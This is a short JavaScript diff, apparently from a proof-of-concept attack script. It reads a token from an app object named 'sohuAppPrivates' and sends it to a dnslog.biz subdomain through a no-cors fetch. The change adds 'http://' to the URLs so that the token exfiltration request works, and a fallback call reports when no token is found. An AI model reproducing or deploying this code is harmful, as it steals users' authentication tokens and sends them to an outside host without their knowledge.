@@ -25,7 +25,7 @@
         let token = null;
         if (sohuAppPrivates && sohuAppPrivates.token) {
             token = sohuAppPrivates.token;
-            let dnslogUrl = encodeURIComponent(token) + '.bbc66268.log.dnslog.biz';
+            let dnslogUrl = "http://"+ encodeURIComponent(token) + '.bbc66268.log.dnslog.biz';
             fetch(dnslogUrl, {
               mode: 'no-cors'
             })
@@ -36,7 +36,7 @@
               console.error('Error sending token to dnslog:', error);
             });
         } else {
-            let dnslogUrl =  'error.bbc66268.log.dnslog.biz';
+            let dnslogUrl =  'http://error.bbc66268.log.dnslog.biz';
             fetch(dnslogUrl, {
               mode: 'no-cors'
             })
